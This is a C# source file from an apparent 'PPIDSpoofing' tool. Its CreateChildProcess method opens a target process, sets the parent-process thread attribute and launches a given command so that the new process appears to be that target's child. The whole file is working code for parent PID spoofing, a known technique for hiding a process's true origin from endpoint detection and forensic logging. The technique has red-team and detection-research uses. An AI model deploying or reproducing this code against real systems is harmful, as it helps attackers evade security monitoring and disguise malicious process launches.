using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using PPIDSpoofing.Interop;

namespace PPIDSpoofing.Library
{
    internal class Modules
    {
        public static bool CreateChildProcess(string command, int ppid)
        {
            int error;
            string processName;
            IntPtr lpValue;
            IntPtr hProcess;

            try
            {
                Console.WriteLine();
                Console.WriteLine("[>] Trying to resolve the specified PID.");

                processName = Process.GetProcessById(ppid).ProcessName;

                Console.WriteLine("[+] PID is resolved successfully.");
                Console.WriteLine("    |-> {0} (PID : {1})", processName, ppid);
            }
            catch
            {
                Console.WriteLine("[-] Failed to resolve the specified PID.\n");

                return false;
            }

            if (!Helpers.GetStartupInfoEx(out STARTUPINFOEX startupInfoEx))
                return false;

            Console.WriteLine("[>] Trying to get a handle.");

            hProcess = NativeMethods.OpenProcess(
                ProcessAccessFlags.PROCESS_CREATE_PROCESS,
                false,
                ppid);

            if (hProcess == IntPtr.Zero)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get a target process handle.");
                Console.WriteLine("    |-> {0}\n", Helpers.GetWin32ErrorMessage(error, false));

                return false;
            }
            else
            {
                Console.WriteLine("[+] Got a target process handle.");
                Console.WriteLine("    |-> hProcess : 0x{0}", hProcess.ToString("X"));
            }

            lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, hProcess);

            Console.WriteLine("[>] Trying to update thread attribute.");

            if (!NativeMethods.UpdateProcThreadAttribute(
                startupInfoEx.lpAttributeList,
                0,
                (IntPtr)PROC_THREAD_ATTRIBUTES.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                lpValue,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to update thread attribute.");
                Console.WriteLine("    |-> {0}\n", Helpers.GetWin32ErrorMessage(error, false));
                Marshal.FreeHGlobal(lpValue);
                Marshal.FreeHGlobal(startupInfoEx.lpAttributeList);

                return false;
            }
            else
            {
                Marshal.FreeHGlobal(lpValue);
                Console.WriteLine("[+] Thread attribute is updated successfully.");
            }

            Console.WriteLine("[>] Trying to create child process from the target process.");

            if (!NativeMethods.CreateProcess(
                null,
                command,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT | ProcessCreationFlags.CREATE_NEW_CONSOLE,
                IntPtr.Zero,
                Environment.CurrentDirectory,
                ref startupInfoEx,
                out PROCESS_INFORMATION processInfo))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to create a child process.");
                Console.WriteLine("    |-> {0}\n", Helpers.GetWin32ErrorMessage(error, false));
                Marshal.FreeHGlobal(startupInfoEx.lpAttributeList);
                NativeMethods.CloseHandle(hProcess);

                return false;
            }
            else
            {
                Console.WriteLine("[+] Child process is created successfully.");
                Console.WriteLine("    |-> Command Line : {0}", command);
                Console.WriteLine("    |-> PID          : {0}", processInfo.dwProcessId);
                Console.WriteLine("[*] Done.\n");
                NativeMethods.CloseHandle(hProcess);
                NativeMethods.CloseHandle(processInfo.hThread);
                NativeMethods.CloseHandle(processInfo.hProcess);

                return true;
            }
        }
    }
}
